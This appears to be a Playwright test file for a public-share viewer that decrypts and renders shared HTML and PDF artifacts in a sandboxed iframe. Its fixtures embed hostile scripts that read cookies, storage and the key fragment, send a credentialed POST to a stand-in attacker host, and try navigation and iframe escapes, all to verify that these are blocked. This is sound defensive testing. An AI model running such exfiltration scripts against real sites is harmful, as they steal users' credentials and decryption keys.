import { test } from 'node:test';
import assert from 'node:assert/strict';
import { createRequire } from 'node:module';
import { build } from 'esbuild';
import { dirname, resolve } from 'node:path';
import { readFile } from 'node:fs/promises';
import { createHash } from 'node:crypto';
import { fileURLToPath } from 'node:url';
import { buildPublicShareViewerBundle } from './buildPublicShareViewer.mjs';

// Playwright is owned by the repository's browser test package. This script
// exercises only the real browser boundary and source-generated viewer bytes.
const repoDir = resolve(dirname(fileURLToPath(import.meta.url)), '../../..');
const requireTests = createRequire(resolve(repoDir, 'packages/tests/package.json'));
const browserTypes = requireTests('@playwright/test');
const { chromium } = browserTypes;
const sourceDir = resolve(repoDir, 'apps/server/sources/app/api/routes/share');
await buildPublicShareViewerBundle({ check: true });
const asset = await readFile(resolve(sourceDir, 'publicShareViewerBundle.generated.ts'), 'utf8');
const script = JSON.parse(asset.slice(asset.indexOf(' = ') + 3).trim().replace(/;$/u, ''));
// Encrypt network fixtures with the canonical writers; the served browser asset
// must fetch and decrypt them itself. No viewer/parser/renderer is replaced.
const fixtureCodecs = await build({ stdin: { contents: `
    export { sealPublicShareDataKeyV1 } from './packages/protocol/src/crypto/publicShareEncryptedDataKeyEnvelopeV0.ts';
    export { sealSessionDataKeyBundleV0, sealAesGcmPayloadWebCrypto } from './packages/protocol/src/crypto/sessionDataKeyBundleWebCrypto.ts';
    export { frameSessionDataKeyBundleV0 } from './packages/protocol/src/crypto/sessionDataKeyBundleV0.ts';
    export { encodePlainArtifactStoredContent } from './packages/protocol/src/storage/artifactStoredContent.ts';
    export { ARTIFACT_HTML_SHELL_CSP_V1 } from './packages/protocol/src/artifacts/artifactHtmlDocumentV1.ts';
`, resolveDir: repoDir }, bundle: true, write: false, platform: 'node', format: 'esm',
    banner: { js: `import { createRequire } from 'node:module'; const require = createRequire(${JSON.stringify(import.meta.url)});` } });
const { sealPublicShareDataKeyV1, sealSessionDataKeyBundleV0, sealAesGcmPayloadWebCrypto, frameSessionDataKeyBundleV0, encodePlainArtifactStoredContent,
    ARTIFACT_HTML_SHELL_CSP_V1: policy } = await import(`data:text/javascript;base64,${Buffer.from(fixtureCodecs.outputFiles[0].text).toString('base64')}`);

// Observe the real browser URL/Blob boundary without replacing its behavior.
// The shell's CSP intentionally denies fetch(blob:), including test probes.
async function observeViewerBlobTypes(context, origin) {
    await context.addInitScript(({ origin }) => {
        if (location.origin !== origin) return;
        const types = new Map();
        const create = URL.createObjectURL;
        URL.createObjectURL = function (object) {
            const url = Reflect.apply(create, this, [object]);
            types.set(url, object.type);
            return url;
        };
        window.publicShareTestBlobTypes = types;
    }, { origin });
}

async function readViewerDownload(page, link) {
    const mime = await link.evaluate(element => window.publicShareTestBlobTypes.get(element.href));
    const pending = page.waitForEvent('download');
    await link.click();
    const download = await pending;
    const stream = await download.createReadStream();
    assert.ok(stream, 'The browser delivers a real downloadable file');
    const chunks = [];
    for await (const chunk of stream) chunks.push(chunk);
    assert.equal(await download.failure(), null);
    return { mime, bytes: [...Buffer.concat(chunks)], name: download.suggestedFilename() };
}

for (const engine of (process.env.HAPPIER_PUBLIC_SHARE_BROWSER_ENGINES ?? 'chromium').split(',')) {
    assert.ok(['chromium', 'firefox', 'webkit'].includes(engine), 'Select a supported browser engine');
    for (const signedIn of [false, true]) test(`${engine}: main-origin /s decrypts HTML and contains hostile content with ${signedIn ? 'signed-in' : 'anonymous'} origin state`, async () => {
        const browser = await browserTypes[engine].launch({ headless: true });
        const context = await browser.newContext();
        const origin = 'https://home.example.test';
        await observeViewerBlobTypes(context, origin);
        const secret = 'A'.repeat(43);
        const auth = 'account-auth-sentinel';
        const key = new Uint8Array(32).fill(19);
        const encryptedDataKey = sealPublicShareDataKeyV1({ dataKey: key, secret, randomBytes: length => new Uint8Array(length).fill(3) });
        const html = `<h1 id="rendered">Main-origin HTML works</h1><link rel="stylesheet" href="css/main.css"><img id="asset" src="café image.svg"><script src="js/日本.js"></script><script>
            window.results={};window.violations=[];
            addEventListener('securitypolicyviolation',e=>violations.push(e.violatedDirective));
            for(const [name,read] of Object.entries({parent:()=>parent.document.body.textContent,fragment:()=>parent.location.hash,
                cookie:()=>document.cookie,storage:()=>localStorage.getItem('auth'),parentStorage:()=>parent.localStorage.getItem('auth')})){
                try{results[name]=read()}catch(e){results[name]='blocked'}
            }
            results.bridge=typeof window.Happier;
            fetch('${origin}/v1/account',{credentials:'include'}).then(()=>results.fetch='allowed',()=>results.fetch='blocked');
            fetch('https://attacker.example.test/leak',{method:'POST',body:'guest',credentials:'include'}).then(()=>results.exfil='allowed',()=>results.exfil='blocked');
            try{results.popup=window.open('https://attacker.example.test/popup')===null?'blocked':'allowed'}catch(e){results.popup='blocked'}
            const form=document.createElement('form');form.method='POST';form.action='${origin}/v1/form-escape';document.body.append(form);try{form.submit()}catch(e){}results.form='attempted';
            try{const iframe=document.createElement('iframe');iframe.src='${origin}/v1/nested-escape';document.body.append(iframe)}catch(e){results.nested='blocked'}
            try{const nested=document.createElement('iframe');nested.srcdoc='<h1>Nested document</h1>';document.body.append(nested)}catch(e){results.nestedSrcdoc='blocked'}
            try{top.location.href='https://attacker.example.test/top'}catch(e){results.top='blocked'}
            </script>`;
        const bundle = { v: 1, entrypoint: 'index.html', files: {
            'index.html': { mime: 'text/html', contentBase64: Buffer.from(html).toString('base64') },
            'css/main.css': { mime: 'text/css', contentBase64: Buffer.from('h1{color:rgb(10,20,30)}').toString('base64') },
            'js/日本.js': { mime: 'application/javascript', contentBase64: Buffer.from('document.getElementById("rendered").dataset.bundle="yes"').toString('base64') },
            'café image.svg': { mime: 'image/svg+xml', contentBase64: Buffer.from('<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1"/>').toString('base64') },
        } };
        const seal = async value => Buffer.from(await sealSessionDataKeyBundleV0(value, key)).toString('base64');
        const bytes = new TextEncoder().encode(JSON.stringify(bundle));
        const reference = { blobId: crypto.randomUUID(), mime: 'application/vnd.happier.html-bundle+json', sizeBytes: bytes.length,
            sha256: createHash('sha256').update(bytes).digest('hex') };
        const blobContent = Buffer.from(frameSessionDataKeyBundleV0(await sealAesGcmPayloadWebCrypto(bytes, key))).toString('base64');
        const response = { subject: { kind: 'artifact', id: 'artifact' }, encryptionMode: 'e2ee', encryptedDataKey,
            keyDerivation: 'fragment_v1', isConsentRequired: false, content: { kind: 'artifact',
                header: await seal({ title: 'Hostile Artifact', kind: 'html' }), body: await seal({ body: reference }),
                blob: { blobId: reference.blobId, content: { t: 'encrypted', c: blobContent } }, headerVersion: 1, bodyVersion: 1 } };
        const pdfBytes = new TextEncoder().encode('%PDF-1.7\nDownload-only public content');
        const pdfReference = { blobId: crypto.randomUUID(), mime: 'application/pdf', sizeBytes: pdfBytes.length,
            sha256: createHash('sha256').update(pdfBytes).digest('hex') };
        const pdfResponse = { subject: { kind: 'artifact', id: 'pdf' }, encryptionMode: 'plain', encryptedDataKey: null,
            keyDerivation: 'fragment_v1', isConsentRequired: false, content: { kind: 'artifact',
                header: encodePlainArtifactStoredContent({ title: 'Shared.pdf', kind: 'pdf' }),
                body: encodePlainArtifactStoredContent({ body: pdfReference }), headerVersion: 1, bodyVersion: 1,
                blob: { blobId: pdfReference.blobId, content: { t: 'plain', v: Buffer.from(pdfBytes).toString('base64') } } } };
        const revision = 'ssr1.AAAACHN5c3JlY18xAAAAAQ';
        const visualReference = { v: 1, itemId: 'visual', itemRevision: revision, sourceAddress: { serverId: 'home', sessionId: 'session' } };
        const visualBundle = { ...bundle, files: { ...bundle.files, 'index.html': { mime: 'text/html', contentBase64: Buffer.from(
            '<h1 id="rendered">Attached bundled HTML visual</h1><link rel="stylesheet" href="css/main.css"><img id="asset" src="café image.svg"><script src="js/日本.js"></script>',
        ).toString('base64') } } };
        const item = { v: 1, destination: 'transcript', title: 'Attached HTML', frame: 'card', height: { mode: 'auto', fallback: 'regular' },
            source: { kind: 'hostedHtml', source: visualBundle } };
        const acknowledgement = { v: 1, serverId: 'home', sessionId: 'session', itemDestination: 'transcript', destination: null,
            result: { operation: 'upsert_item', itemId: 'visual', itemRevision: revision, outcome: 'created' } };
        const sessionResponse = { subject: { kind: 'session', id: 'session' }, encryptionMode: 'e2ee', encryptedDataKey,
            keyDerivation: 'fragment_v1', isConsentRequired: false, networkOff: true, messagesAccessToken: 'visual-grant',
            content: { kind: 'session', metadata: null, metadataVersion: 0, agentState: null, agentStateVersion: 0, hasMore: false, nextBeforeSeq: null,
                messages: [{ id: 'call', seq: 1, createdAt: 1, content: { t: 'encrypted', c: await seal({ role: 'agent', content: { type: 'codex', data: {
                    type: 'tool-call', callId: 'tool', id: 'call', name: 'session_board_item_upsert',
                    input: { itemId: 'visual', expectedItemRevision: null, destination: 'transcript', item },
                } } }) } }, { id: 'answer', seq: 2, createdAt: 2, surfaceItemReference: visualReference,
                    content: { t: 'encrypted', c: await seal({ role: 'agent', content: { type: 'codex', data: {
                        type: 'tool-call-result', callId: 'tool', id: 'answer', output: JSON.stringify(acknowledgement), isError: false,
                    } } }) } }] } };
        const visualResponse = { messageId: 'answer', encryptionMode: 'e2ee', networkOff: true, reference: visualReference,
            record: { id: 'record', revision, address: { owner: 'host', namespace: 'surface', kind: 'item.v1', localId: 'visual' },
                content: { t: 'encrypted', c: await seal(item) }, createdAt: '2026-10-10T00:00:00.000Z', updatedAt: '2026-10-10T00:00:00.000Z' } };
        const forbidden = [];
        const contentRequests = [];
        const visualRequests = [];
        const navigationRequests = [];
        const page = await context.newPage();
        const popups = [];
        context.on('page', popup => { if (popup !== page) popups.push(popup); });
        if (signedIn) {
            await context.addCookies([{ name: 'account-cookie', value: 'cookie-sentinel', url: origin }]);
            await context.addInitScript(({ auth }) => {
                if (location.origin === 'https://home.example.test') localStorage.setItem('auth', auth);
            }, { auth });
        }
        await context.route('**/*', async route => {
            const request = route.request();
            const url = new URL(request.url());
            if (url.origin === origin && /^\/s\/(?:lookup|session|pdf)$/u.test(url.pathname)) {
                navigationRequests.push(request);
                await route.fulfill({ contentType: 'text/html', headers: { 'content-security-policy': `${policy}; frame-ancestors 'none'`,
                    'referrer-policy': 'no-referrer', 'cache-control': 'no-store', 'cross-origin-opener-policy': 'same-origin' },
                    body: `<p id="account-state" hidden>parent-dom-sentinel</p><main id="public-share-viewer" data-public-share-delivery="main-origin"></main><script src="${url.pathname}/viewer.js"></script>` });
            } else if (url.origin === origin && /^\/s\/(?:lookup|session|pdf)\/viewer.js$/u.test(url.pathname)) {
                navigationRequests.push(request);
                await route.fulfill({ contentType: 'application/javascript', body: script });
            } else if (url.origin === origin && /^\/v1\/public-shares\/(?:lookup|session|pdf)\/content$/u.test(url.pathname)) {
                contentRequests.push(request);
                await route.fulfill({ contentType: 'application/json', body: JSON.stringify(url.pathname.includes('/session/') ? sessionResponse
                    : url.pathname.includes('/pdf/') ? pdfResponse : response) });
            } else if (url.origin === origin && url.pathname === '/v1/public-shares/session/visual/answer') {
                visualRequests.push(request);
                await route.fulfill({ contentType: 'application/json', body: JSON.stringify(visualResponse) });
            } else { forbidden.push(request.url()); await route.fulfill({ body: 'unauthorized request reached' }); }
        });
        try {
            const landing = `${origin}/s/lookup#k=${secret}`;
            const loaded = await page.goto(landing);
            assert.equal(loaded.headers()['content-security-policy'], `${policy}; frame-ancestors 'none'`);
            const guest = page.frameLocator('iframe');
            await guest.locator('#rendered[data-bundle="yes"]').waitFor();
            const inner = page.frames().find(frame => frame.url() === 'about:srcdoc');
            assert.ok(inner, 'Decrypted content is mounted into the opaque frame');
            assert.equal(await page.locator('iframe').getAttribute('sandbox'), 'allow-scripts');
            await inner.waitForFunction(() => window.results?.fetch === 'blocked' && window.results?.exfil === 'blocked');
            // Sandbox and CSP both deny forms; the browser may enforce the
            // sandbox first without emitting a form-action violation event.
            // Assert the attempted submission and absence of escaped requests.
            assert.deepEqual(await inner.evaluate(() => window.results), { parent: 'blocked', fragment: 'blocked', cookie: 'blocked', storage: 'blocked',
                parentStorage: 'blocked', bridge: 'undefined', fetch: 'blocked', exfil: 'blocked', popup: 'blocked', form: 'attempted', nested: 'blocked', nestedSrcdoc: 'blocked', top: 'blocked' });
            assert.equal(await inner.locator('#rendered').evaluate(element => getComputedStyle(element).color), 'rgb(10, 20, 30)');
            assert.equal(await inner.locator('#asset').evaluate(element => element.complete && element.naturalWidth > 0), true);
            assert.equal(await page.evaluate(() => localStorage.getItem('auth')), signedIn ? auth : null);
            assert.equal(await page.evaluate(() => document.cookie), signedIn ? 'account-cookie=cookie-sentinel' : '');
            assert.equal(contentRequests.length, 1, 'The real viewer fetched the encrypted content');
            const navigationHeaders = await Promise.all(navigationRequests.map(request => request.allHeaders()));
            assert.ok(navigationHeaders.every(headers => signedIn ? headers.cookie?.includes('cookie-sentinel') : headers.cookie === undefined),
                'Navigation carries only the configured browser credentials');
            for (const request of contentRequests) {
                const headers = await request.allHeaders();
                assert.equal(headers.cookie, undefined);
                assert.equal(headers.authorization, undefined);
                assert.equal(headers.referer, undefined);
                assert.ok(!request.url().includes(secret));
            }
            for (const scheme of ['data', 'blob', 'https']) {
                // A blocked navigation may replace srcdoc with a browser error
                // document. Reload so every attack starts in authored content.
                await page.reload();
                await guest.locator('#rendered[data-bundle="yes"]').waitFor();
                const target = page.frames().find(frame => frame.url() === 'about:srcdoc');
                assert.ok(target);
                await page.evaluate(() => { window.blockedNavigation = false; addEventListener('securitypolicyviolation', event => {
                    if (event.effectiveDirective === 'frame-src' && event.disposition === 'enforce') window.blockedNavigation = true;
                }); });
                await target.evaluate(({ scheme, origin }) => {
                    const content = `<script>window.navigationEscapeExecuted=true;fetch('${origin}/v1/navigation-escape',{credentials:'include'})<\/script>`;
                    location.href = scheme === 'data' ? `data:text/html,${encodeURIComponent(content)}`
                        : scheme === 'blob' ? URL.createObjectURL(new Blob([content], { type: 'text/html' })) : 'https://attacker.example.test/self';
                }, { scheme, origin });
                await page.waitForFunction(() => window.blockedNavigation === true);
                assert.ok(['about:srcdoc', 'chrome-error://chromewebdata/'].includes(target.url()),
                    `${scheme} navigation did not load an authored replacement document: ${target.url()}`);
                assert.notEqual(await target.evaluate(() => window.navigationEscapeExecuted), true);
                assert.equal(page.url(), landing);
                assert.deepEqual(forbidden, [], `${scheme} navigation did not send an escaped request`);
            }
            assert.deepEqual(forbidden, [], 'No authenticated API, form, nested frame, or external request escaped');
            assert.equal(popups.length, 0);
            assert.equal(page.frames().length, 2, 'Nested authored documents have not acquired a browsing context');
            // Wrong fragment must fail the genuine decrypt path without mounting HTML.
            const requestsBeforeWrongKey = contentRequests.length;
            await page.goto(`${origin}/s/lookup#k=${'B'.repeat(43)}`);
            await page.locator('#public-share-viewer').filter({ hasText: 'key is incorrect' }).waitFor();
            assert.equal(await page.locator('iframe').count(), 0);
            assert.equal(contentRequests.length, requestsBeforeWrongKey + 1);
            await page.goto(`${origin}/s/session#k=${secret}`);
            await page.getByRole('button', { name: 'Open visual attached to message 2' }).click();
            const attached = page.frameLocator('[data-message-id="answer"] iframe');
            await attached.locator('#rendered[data-bundle="yes"]').waitFor();
            assert.equal(await attached.locator('#rendered').textContent(), 'Attached bundled HTML visual');
            assert.equal(await attached.locator('#rendered').evaluate(element => getComputedStyle(element).color), 'rgb(10, 20, 30)');
            assert.equal(await attached.locator('#asset').evaluate(element => element.complete && element.naturalWidth > 0), true);
            assert.equal(await page.locator('[data-message-id="answer"] iframe').getAttribute('sandbox'), 'allow-scripts');
            assert.equal(visualRequests.length, 1, 'The genuine lazy viewer fetches and decrypts the corresponding attached visual');
            const visualHeaders = await visualRequests[0].allHeaders();
            assert.equal(visualHeaders['x-public-share-messages-access-token'], 'visual-grant');
            assert.equal(visualHeaders.cookie, undefined);
            assert.equal(visualHeaders.authorization, undefined);
            assert.equal(visualHeaders.referer, undefined);
            assert.ok(!visualRequests[0].url().includes(secret));
            assert.deepEqual(forbidden, []);
            await page.goto(`${origin}/s/pdf#k=${secret}`);
            const download = page.getByRole('link', { name: 'Download file' });
            await download.waitFor();
            assert.equal(await page.locator('object, iframe, embed').count(), 0, 'Main-origin PDF never mounts native active content');
            assert.equal(await download.getAttribute('download'), 'Shared.pdf');
            const downloaded = await readViewerDownload(page, download);
            assert.equal(downloaded.mime, 'application/octet-stream');
            assert.deepEqual(downloaded.bytes, [...pdfBytes]);
            assert.equal(downloaded.name, 'Shared.pdf');
            for (const request of contentRequests) {
                const headers = await request.allHeaders();
                assert.equal(headers.cookie, undefined);
                assert.equal(headers.authorization, undefined);
                assert.equal(headers.referer, undefined);
                assert.ok(!request.url().includes(secret));
            }
            assert.deepEqual(forbidden, []);
        } finally { await context.close(); await browser.close(); }
    });
}

test('real HTML bytes render Unicode bundle assets without application authority or data/blob navigation escape', async () => {
    const browser = await chromium.launch({ headless: true });
    const context = await browser.newContext();
    let apiRequests = 0;
    let isolatedApiRequests = 0;
    let externalNavigations = 0;
    let leakedSecret = false;
    const appOrigin = 'https://app.example.test';
    const isolatedOrigin = 'https://artifact.preview.example.test';
    await observeViewerBlobTypes(context, isolatedOrigin);
    const html = `<h1 id="rendered">HTML works</h1><link rel="stylesheet" href="css/main.css"><img id="asset" src="café image.svg"><script src="js/日本.js"></script><script>
        window.results={};
        try{results.cookie=document.cookie}catch(e){results.cookie='blocked'}
        try{results.storage=localStorage.getItem('app-secret')}catch(e){results.storage='blocked'}
        try{results.parent=parent.document.cookie}catch(e){results.parent='blocked'}
        fetch('${appOrigin}/v1/account').then(()=>results.fetch='allowed',()=>results.fetch='blocked');
        addEventListener('securitypolicyviolation',e=>{if(e.violatedDirective==='connect-src')results.csp=true});
        </script>`;
    const files = {
        'index.html': { mime: 'text/html', contentBase64: Buffer.from(html).toString('base64') },
        'css/main.css': { mime: 'text/css', contentBase64: Buffer.from('@import "nested.css";body{background-image:url("../café image.svg")}').toString('base64') },
        'css/nested.css': { mime: 'text/css', contentBase64: Buffer.from('h1{color:rgb(10,20,30)}').toString('base64') },
        'js/日本.js': { mime: 'application/javascript', contentBase64: Buffer.from('document.getElementById("rendered").dataset.bundle="yes"').toString('base64') },
        'café image.svg': { mime: 'image/svg+xml', contentBase64: Buffer.from('<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1"/>').toString('base64') },
    };
    const fragment = 'A'.repeat(43);
    let previewBundle = { v: 1, entrypoint: 'index.html', files };
    let previewPdf = false;
    const pdfBytes = Buffer.from('%PDF-1.7\nIsolated public PDF');
    context.on('request', request => { if (request.url().includes(fragment)) leakedSecret = true; });
    await context.addCookies([{ name: 'app-cookie', value: 'secret', url: appOrigin }]);
    await context.route('**/*', async route => {
        const url = new URL(route.request().url());
        if (url.origin === isolatedOrigin && (await route.request().allHeaders()).cookie?.includes('app-cookie')) leakedSecret = true;
        if (url.origin === appOrigin) {
            if (url.pathname === '/v1/account') { apiRequests++; await route.fulfill({ body: 'API reached' }); return; }
            await route.fulfill({ contentType: 'text/html', body: `<script>localStorage.setItem('app-secret','secret')</script><iframe id="preview" src="${isolatedOrigin}/s/lookup#k=${fragment}"></iframe>` });
        } else if (url.origin === isolatedOrigin && url.pathname === '/v1/leak') { isolatedApiRequests++; await route.fulfill({ body: 'API reached' }); }
        else if (url.origin === isolatedOrigin && url.pathname === '/v1/public-shares/lookup/content') {
            const bytes = previewPdf ? pdfBytes : Buffer.from(JSON.stringify(previewBundle));
            const blobId = crypto.randomUUID();
            const reference = { blobId, mime: previewPdf ? 'application/pdf' : 'application/vnd.happier.html-bundle+json',
                sizeBytes: bytes.length, sha256: createHash('sha256').update(bytes).digest('hex') };
            await route.fulfill({ contentType: 'application/json', body: JSON.stringify({
                subject: { kind: 'artifact', id: 'artifact' }, encryptionMode: 'plain', encryptedDataKey: null,
                keyDerivation: 'fragment_v1', isConsentRequired: false, content: { kind: 'artifact', headerVersion: 1, bodyVersion: 1,
                    header: encodePlainArtifactStoredContent({ title: previewPdf ? 'Shared.pdf' : 'HTML Artifact', kind: previewPdf ? 'pdf' : 'html' }),
                    body: encodePlainArtifactStoredContent({ body: reference }),
                    blob: { blobId, content: { t: 'plain', v: bytes.toString('base64') } } },
            }) });
        }
        else if (url.origin === isolatedOrigin && url.pathname.endsWith('/viewer.js')) await route.fulfill({ contentType: 'application/javascript', body: script });
        else if (url.origin === isolatedOrigin) await route.fulfill({ contentType: 'text/html', headers: { 'content-security-policy': policy }, body: '<main id="public-share-viewer" data-public-share-delivery="isolated-origin"></main><script src="/s/lookup/viewer.js"></script>' });
        else { externalNavigations++; await route.fulfill({ body: 'External request reached' }); }
    });
    try {
        const page = await context.newPage();
        await page.goto(appOrigin);
        const guest = page.frameLocator('#preview').frameLocator('iframe');
        await Promise.race([
            guest.locator('#rendered[data-bundle="yes"]').waitFor(),
            page.frameLocator('#preview').locator('#public-share-viewer').filter({ hasText: 'could not be opened' }).waitFor().then(() => assert.fail('Valid Unicode bundle failed to render')),
        ]);
        const inner = page.frames().find(frame => frame.url() === 'about:srcdoc');
        assert.ok(inner, 'The document renders inside the inner sandbox');
        await inner.waitForFunction(() => window.results?.fetch === 'blocked');
        assert.deepEqual(await inner.evaluate(() => window.results), { cookie: 'blocked', storage: 'blocked', parent: 'blocked', fetch: 'blocked', csp: true });
        assert.equal(await inner.locator('#rendered').evaluate(element => getComputedStyle(element).color), 'rgb(10, 20, 30)');
        assert.equal(await inner.locator('#asset').evaluate(element => element.complete && element.naturalWidth > 0), true);
        assert.equal(await page.locator('#preview').evaluate(element => element.contentWindow === window), false);
        assert.equal(await page.evaluate(() => localStorage.getItem('app-secret')), 'secret');
        await inner.evaluate(() => { location.href = 'https://external.example.test/escape'; });
        await page.waitForTimeout(100);
        assert.equal(apiRequests, 0);
        assert.equal(externalNavigations, 0);
        assert.equal(leakedSecret, false);
        // Navigated data/blob documents would otherwise regain the outer shell's
        // fetch permission. The actual delivery policy must deny both before load.
        for (const scheme of ['data', 'blob']) {
            const preview = page.frames().find(frame => frame.url().startsWith(isolatedOrigin));
            assert.ok(preview);
            await preview.evaluate(() => { location.reload(); });
            await guest.locator('#rendered[data-bundle="yes"]').waitFor();
            const target = page.frames().find(frame => frame.url() === 'about:srcdoc');
            const shell = page.frames().find(frame => frame.url().startsWith(isolatedOrigin));
            assert.ok(target);
            assert.ok(shell);
            await shell.evaluate(() => addEventListener('securitypolicyviolation', event => { if (event.violatedDirective === 'frame-src') window.blockedNavigation = true; }));
            await target.evaluate(({ origin, scheme }) => {
                const content = `<script>fetch('${origin}/v1/leak').then(()=>window.navigatedFetch='allowed',()=>window.navigatedFetch='blocked')</script>`;
                location.href = scheme === 'data' ? `data:text/html,${encodeURIComponent(content)}` : URL.createObjectURL(new Blob([content], { type: 'text/html' }));
            }, { origin: isolatedOrigin, scheme });
            await shell.waitForFunction(() => window.blockedNavigation === true);
            assert.equal(/^(data|blob):/u.test(target.url()), false);
            assert.equal(isolatedApiRequests, 0);
        }
        // Uppercase module scripts are supported. A missing bundled import is
        // genuinely invalid and must fail before authored content is mounted.
        const invalid = { v: 1, entrypoint: 'index.html', files: { 'index.html': { mime: 'text/html',
            contentBase64: Buffer.from('<h1>Invalid</h1><script type="MODULE">import "./missing.js"</script>').toString('base64') } } };
        previewBundle = invalid;
        await page.locator('#preview').evaluate((element, value) => { element.src = value; }, `${isolatedOrigin}/s/lookup#k=${'B'.repeat(43)}`);
        await page.frameLocator('#preview').locator('#public-share-viewer').filter({ hasText: 'could not be opened' }).waitFor();
        assert.equal(await page.frameLocator('#preview').locator('iframe').count(), 0);
        previewPdf = true;
        await page.goto(appOrigin);
        const pdf = page.frameLocator('#preview').locator('object[type="application/pdf"]');
        await pdf.waitFor();
        const inlineUrl = await pdf.getAttribute('data');
        const download = page.frameLocator('#preview').getByRole('link', { name: 'Download file' });
        assert.equal(await download.getAttribute('href'), inlineUrl, 'Native PDF and download consume the same Blob');
        const inline = await readViewerDownload(page, download);
        assert.equal(inline.mime, 'application/pdf', 'Only the isolated shell retains native inline PDF delivery');
        assert.deepEqual(inline.bytes, [...pdfBytes]);
        assert.equal(inline.name, 'Shared.pdf');
        assert.equal(apiRequests, 0);
        assert.equal(externalNavigations, 0);
        assert.equal(leakedSecret, false);
    } finally { await context.close(); await browser.close(); }
});
